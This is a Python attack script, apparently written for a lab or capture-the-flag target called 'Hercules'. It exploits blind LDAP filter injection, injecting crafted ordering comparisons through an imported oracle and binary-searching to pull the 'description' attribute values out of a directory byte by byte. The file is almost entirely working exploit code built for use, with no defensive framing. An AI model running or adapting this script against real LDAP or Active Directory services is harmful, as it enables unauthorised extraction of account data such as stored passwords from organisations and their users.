#!/usr/bin/env python3
"""
Exact-byte blind extraction via LDAP ordering comparisons (Hercules).

Wildcards/escapes are unusable inside a prefix test when the value itself
contains '*', so instead use comparisons which treat values literally:

  exists_ge(p,c) := (attr>=p+c) AND (attr<p+DEL)      DEL = 0x7f
  exists_eq(p,c) := (attr>=p+c) AND (attr<p+chr(c+1))
  exists_exact(p):= (attr=p)

Binary search finds the smallest byte >= c present at position len(p),
which for the smallest matching entry is exactly its next byte.
"""
import sys
import time

import pool_extract as P

P.init_pool()

DEL = chr(0x7F)
ATTR = "description"


def ge(p, c):
    return P.oracle(f"*)({ATTR}>={p}{c})({ATTR}<{p}{DEL}")


def eq(p, c):
    nxt = chr(ord(c) + 1)
    return P.oracle(f"*)({ATTR}>={p}{c})({ATTR}<{p}{nxt}")


def exact(p):
    return P.oracle(f"*)({ATTR}={p})(sAMAccountName=*")


def next_byte(p):
    # full byte range: values may contain control characters (newlines etc.)
    lo, hi = 0x01, 0x7E
    if not ge(p, chr(lo)):
        return None
    while lo < hi:
        mid = (lo + hi) // 2
        if ge(p, chr(mid)):
            hi = mid
        else:
            lo = mid + 1
    c = chr(lo)
    if eq(p, c):
        return c
    return None


def extract(prefix="", maxlen=60):
    val = prefix
    t0 = time.time()
    while len(val) < maxlen:
        c = next_byte(val)
        if c is None:
            break
        val += c
        print(f"    {val!r}   [{P.REQ[0]} req, {time.time()-t0:.0f}s]", flush=True)
    print(f"  END: {val!r}  exact={exact(val)}", flush=True)
    return val


def all_values(max_count=12):
    """Walk the value space in order, extracting each distinct description."""
    out = []
    start = ""
    for _ in range(max_count):
        v = extract(start, maxlen=80)
        if not v or v == start:
            break
        out.append(v)
        print(f"  value #{len(out)}: {v!r}", flush=True)
        start = v + chr(0x01)
    return out


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "all":
        vals = all_values()
        print(f"\nALL DESCRIPTIONS: {vals}", flush=True)
    else:
        pre = sys.argv[1] if len(sys.argv) > 1 else ""
        print(f"=== exact extraction of {ATTR!r} starting {pre!r} ===", flush=True)
        v = extract(pre)
        print(f"\nEXTRACTED: {v!r}", flush=True)
    print(f"requests: {P.REQ[0]}", flush=True)
